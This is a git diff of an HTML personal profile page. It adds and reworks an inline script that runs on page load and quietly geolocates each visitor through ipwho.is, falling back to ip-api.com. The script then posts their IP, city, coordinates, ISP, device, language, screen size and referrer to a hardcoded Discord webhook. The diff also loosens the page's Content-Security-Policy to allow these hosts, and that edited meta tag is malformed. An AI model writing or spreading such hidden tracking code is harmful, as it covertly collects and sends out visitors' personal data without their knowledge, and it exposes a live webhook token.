@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta http-equiv="Content-Security-Policy" content="default-src 'self' data: blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdnjs.cloudflare.com https://fonts.googleapis.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://fonts.gstatic.com; img-src * data: blob:; connect-src https://api.lanyard.rest wss://api.lanyard.rest https://cdn.discordapp.com https://i.scdn.co https://media.discordapp.net; font-src https://fonts.gstatic.com; frame-ancestors 'none';">
+<meta http-equiv="<meta http-equiv="Content-Security-Policy" content="default-src 'self' data: blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdnjs.cloudflare.com https://fonts.googleapis.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://fonts.gstatic.com; img-src * data: blob:; connect-src https://api.lanyard.rest wss://api.lanyard.rest https://cdn.discordapp.com https://i.scdn.co https://media.discordapp.net https://ipwho.is https://discord.com http://ip-api.com; font-src https://fonts.gstatic.com; frame-ancestors 'none';">
 <meta name="referrer" content="strict-origin-when-cross-origin">
 
 <!-- ═══ SEO ═══ -->
@@ -205,70 +205,95 @@ var _f=new TextDecoder('utf-8').decode(_e);
 (function(){
   var WH='https://discord.com/api/webhooks/1484607173945331743/wXRm6FAN3nnYMMR1JDG6AsYmUbybS1i6V7noj425MloyqEvn1PTDZBEW8MizuVj9mf-T';
 
-  function pad(n){return String(n).padStart(2,'0');}
-  function tsNow(){
+  function pad(n){return n<10?'0'+n:String(n);}
+  function ts(){
     var d=new Date();
-    return d.getFullYear()+'-'+pad(d.getMonth()+1)+'-'+pad(d.getDate())
-      +' '+pad(d.getHours())+':'+pad(d.getMinutes())+':'+pad(d.getSeconds());
+    return d.getUTCFullYear()+'-'+pad(d.getUTCMonth()+1)+'-'+pad(d.getUTCDate())
+      +' '+pad(d.getUTCHours())+':'+pad(d.getUTCMinutes())+':'+pad(d.getUTCSeconds())+' UTC';
   }
 
-  function send(ip,city,country,cc,isp,lat,lon){
-    var ref=document.referrer||'Direct';
+  function sendWebhook(geo){
     var ua=navigator.userAgent;
-    var dev='🖥️ Desktop';
-    if(/Mobi|Android/i.test(ua))dev='📱 Mobile';
-    else if(/Tablet|iPad/i.test(ua))dev='📟 Tablet';
-    var tz=Intl&&Intl.DateTimeFormat?Intl.DateTimeFormat().resolvedOptions().timeZone:'Unknown';
-    var lang=navigator.language||'Unknown';
-    var sw=screen.width+'x'+screen.height;
-    var ts=tsNow();
+    var dev='/';
+    if(/Mobi|Android/i.test(ua)) dev='Mobile';
+    else if(/Tablet|iPad/i.test(ua)) dev='Tablet';
+    else dev='Desktop';
 
-    var payload={
-      username:'🔔 Bio Card Visitor',
-      avatar_url:'https://cdn.discordapp.com/embed/avatars/0.png',
+    var tz='Unknown';
+    try{tz=Intl.DateTimeFormat().resolvedOptions().timeZone;}catch(_){}
+
+    var ref=document.referrer||'Direct';
+    var ip=geo?geo.ip:'Unknown';
+    var city=geo?geo.city:'?';
+    var country=geo?geo.country:'?';
+    var cc=geo?geo.country_code:'';
+    var isp=geo&&geo.connection?geo.connection.isp:'?';
+    var coords=(geo&&geo.latitude&&geo.longitude)?geo.latitude+', '+geo.longitude:'?';
+    var flagEmoji=cc?String.fromCodePoint.apply(null,cc.toUpperCase().split('').map(function(c){return c.charCodeAt(0)+127397;})):'';
+
+    var body=JSON.stringify({
+      username:'Visitor Alert',
+      avatar_url:'https://cdn.discordapp.com/avatars/1045863666412687380/'+
+        (typeof __avHash!=='undefined'?__avHash:'a_default')+'.webp?size=64',
       embeds:[{
-        title:'👁️ New Visitor',
-        color:0xd4af37,
+        title:'\uD83D\uDC41\uFE0F  New Visitor on ov1x.is-a.dev',
+        color:13938487,
+        description:'Someone just visited your bio card!',
         fields:[
-          {name:'🌐 IP Address',  value:'`'+ip+'`',          inline:true},
-          {name:'🏙️ City',        value:city||'Unknown',      inline:true},
-          {name:'🌍 Country',     value:(cc?':flag_'+cc.toLowerCase()+': ':'')+( country||'Unknown'), inline:true},
-          {name:'🏢 ISP',         value:isp||'Unknown',       inline:true},
-          {name:'📍 Coordinates', value:lat&&lon?lat+', '+lon:'Unknown', inline:true},
-          {name:'🕐 Timezone',    value:tz,                   inline:true},
-          {name:'💻 Device',      value:dev,                  inline:true},
-          {name:'🗣️ Language',    value:lang,                 inline:true},
-          {name:'🖥️ Resolution',  value:sw,                   inline:true},
-          {name:'🔗 Referrer',    value:ref.length>80?ref.slice(0,80)+'…':ref, inline:false},
-          {name:'🌍 URL',         value:'`'+location.href+'`', inline:false},
-          {name:'🖥️ User Agent',  value:'```'+ua.slice(0,200)+'```', inline:false},
+          {name:'\uD83C\uDF0E IP',        value:'`'+(ip||'?')+'`',             inline:true},
+          {name:'\uD83C\uDFD9\uFE0F City', value:city||'?',                    inline:true},
+          {name:'\uD83C\uDDFA\uD83C\uDDF8 Country',value:(flagEmoji?flagEmoji+' ':'')+country,inline:true},
+          {name:'\uD83C\uDFE2 ISP',        value:isp,                          inline:true},
+          {name:'\uD83D\uDCCD Coords',    value:coords,                        inline:true},
+          {name:'\uD83D\uDD50 Timezone',  value:tz,                            inline:true},
+          {name:'\uD83D\uDCBB Device',    value:dev,                           inline:true},
+          {name:'\uD83D\uDDEF\uFE0F Lang',value:navigator.language||'?',      inline:true},
+          {name:'\uD83D\uDDA5\uFE0F Screen',value:screen.width+'x'+screen.height,inline:true},
+          {name:'\uD83D\uDD17 URL',       value:'`'+location.href+'`',         inline:false},
+          {name:'\uD83D\uDCE4 Referrer',  value:ref.length>100?ref.slice(0,100)+'\u2026':ref,inline:false},
         ],
-        footer:{text:'⏰ '+ts},
-        thumbnail:{url:'https://cdn.discordapp.com/embed/avatars/0.png'}
+        footer:{text:'\u23F0 '+ts()},
       }]
-    };
+    });
 
-    fetch(WH,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}).catch(function(){});
+    fetch(WH,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:body
+    }).catch(function(){
+      // retry once after 2s
+      setTimeout(function(){
+        fetch(WH,{method:'POST',headers:{'Content-Type':'application/json'},body:body}).catch(function(){});
+      },2000);
+    });
   }
 
-  // Fetch visitor IP + geo info then send
-  fetch('https://ipwho.is/')
-    .then(function(r){return r.json();})
-    .then(function(d){
-      send(
-        d.ip||'Unknown',
-        d.city||'',
-        d.country||'',
-        d.country_code||'',
-        d.connection&&d.connection.isp?d.connection.isp:'',
-        d.latitude||'',
-        d.longitude||''
-      );
-    })
-    .catch(function(){
-      // fallback: send without geo
-      send('Unknown','','','','','','');
-    });
+  // Get IP + geo from ipwho.is (free, no key needed)
+  function run(){
+    fetch('https://ipwho.is/',{cache:'no-store'})
+      .then(function(r){
+        if(!r.ok)throw new Error(r.status);
+        return r.json();
+      })
+      .then(function(d){sendWebhook(d);})
+      .catch(function(){
+        // fallback: try ip-api.com
+        fetch('http://ip-api.com/json/',{cache:'no-store'})
+          .then(function(r){return r.json();})
+          .then(function(d){
+            sendWebhook({
+              ip:d.query,city:d.city,country:d.country,
+              country_code:d.countryCode,
+              connection:{isp:d.isp},
+              latitude:d.lat,longitude:d.lon
+            });
+          })
+          .catch(function(){sendWebhook(null);});
+      });
+  }
+
+  // Fire after 1s so page load doesn't block
+  setTimeout(run, 1000);
 })();
 </script>
 </body>
